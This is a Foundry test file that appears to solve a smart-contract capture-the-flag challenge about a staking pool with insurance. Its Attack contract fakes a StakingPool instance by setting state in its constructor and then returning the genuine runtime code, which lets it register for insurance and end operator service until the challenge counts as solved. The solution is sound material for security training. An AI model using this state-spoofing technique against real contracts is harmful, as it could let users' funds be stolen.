// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {StakingPool} from "EthStaking/contracts/StakingPool.sol";
import {Challenge} from "EthStaking/contracts/Challenge.sol";
import {Insurance} from "EthStaking/contracts/Insurance.sol";

contract StakingPoolTest is Test {
    StakingPool public stakingpool;
    Challenge public challenge;
    Insurance public insurance;

    function setUp() public {
        skip(1000 days);
        vm.deal(address(1), 10 ether);
        vm.prank(address(1));
        challenge = new Challenge{value: 10 ether}();
        stakingpool = challenge.pool();
        insurance = challenge.insurance();
    }

    function test_StakingPoolSolution() public {
        Attack attack = new Attack(address(challenge), address(insurance));
        attack.registerInsurance();
        attack.endOperatorService();
        assertTrue(challenge.isSolved());
    }
}

contract Attack is StakingPool {
    constructor(address _operator, address _insurance) StakingPool(_operator, _insurance) {
        bytes memory code = type(StakingPool).runtimeCode;
        state = State.Validating;
        deposits[msg.sender] = 1;
        assembly {
            return(add(code, 0x20), mload(code))
        }
    }
}